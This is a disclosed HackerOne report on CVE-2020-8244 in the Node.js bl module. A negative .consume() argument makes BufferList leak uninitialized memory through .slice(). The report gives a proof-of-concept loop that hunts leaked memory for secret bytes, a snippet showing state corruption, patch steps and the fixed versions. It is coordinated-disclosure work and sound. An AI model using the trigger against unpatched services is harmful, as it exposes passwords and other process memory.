---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/buffer-over-read
  - env/web
  - stack/node
substate: "resolved"
weakness: "Buffer Over-read"
enriched: true
body: true
date: 2020-08-27
submitted: 2020-08-24T22:04:17.543Z
bounty_usd: null
votes: 1
cve: "CVE-2020-8244"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/966347"
title: "[bl] Uninitialized memory exposure via negative .consume()"
---
# [bl] Uninitialized memory exposure via negative .consume()

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-27

- Report: [https://hackerone.com/reports/966347](https://hackerone.com/reports/966347)
- CWE: Buffer Over-read | CVE: CVE-2020-8244
- Submitted: 2020-08-24T22:04:17.543Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Module

**module name:** bl
**version:** 4.0.2
**npm page:** `https://www.npmjs.com/package/bl`

## Module Description

> A Node.js Buffer list collector, reader and streamer thingy.

## Module Stats

8 660 595 weekly downloads

# Vulnerability

## Vulnerability Description

If user input (even typed) ends up in `consume()` argument and can become negative,
BufferList state can be corrupted, tricking it into exposing uninitialized memory via
regular `.slice()` calls.

## Steps To Reproduce:

```
const { BufferList } = require('bl')
const secret = require('crypto').randomBytes(256)
for (let i = 0; i < 1e6; i++) {
  const clone = Buffer.from(secret)
  const bl = new BufferList()
  bl.append(Buffer.from('a'))
  bl.consume(-1024)
  const buf = bl.slice(1)
  if (buf.indexOf(clone) !== -1) {
    console.error(`Match (at ${i})`, buf)
  }
}
```

## Patch

### First component (more important):

In `BufferList.prototype.copy`, before the last `return dst`:
```js
  if (dst.length !== bufoff) return dst.slice(0, bufoff)
```

### Second component:

Check `.consume()` argument to be a non-negative integer.

## Supporting Material/References:

- Node.js v14.8.0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

## Impact

In case if the argument of `consume()` is attacker controlled:
1. Expose uninitialized memory, containing source code, passwords, network traffic, etc.
2. Cause invalid data in slices (low control)
3. Cause DoS by allocating a large buffer this way (with a large negative number before a slice/toString call is performed).

## Timeline

- **Report Filed**
- **2020-08-24** @chalker: As a rule of thumb, when using `allocUnsafe()`, the number of bytes actually written should be rechecked and the resulting buffer should be shrinked to actually written size before being returned.
- **2020-08-25** @mcollina: @marcinhoppe I have publish rights on bl. I can prepare a patch and release. Do you mind if I claim this report?
- **2020-08-25** @marcinhoppe: @mcollina I don't mind at all :). Feel free to grab it.
- **2020-08-26** @chalker: This also seems to corrupt internal state:
```js
const bl = new BufferList()
bl.append(Buffer.from('abcd'))
for (let i = 0; i < 100; i++) bl.consume(0.75)
bl.consume(4)
console.log(bl.length) // -75
```
Doesn't seem very significant, but it can be fixed by the same improvements in consume().
- **2020-08-26** @chalker: Here is a complete patch: https://gist.github.com/ChALkeR/8bcf5cc9faf907ac8e54d67a5bc45296
- **2020-08-26** @mcollina: bl@4.0.3
bl@3.0.1
bl@2.2.1

have been released with the fix.
- **2020-08-27** @chalker: I can confirm that those contain the fix.

Can we triage/disclose now?
- **Report Needs More Info**
- **Report Triaged**
- **Report Resolved**
- **Cve Id Added**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
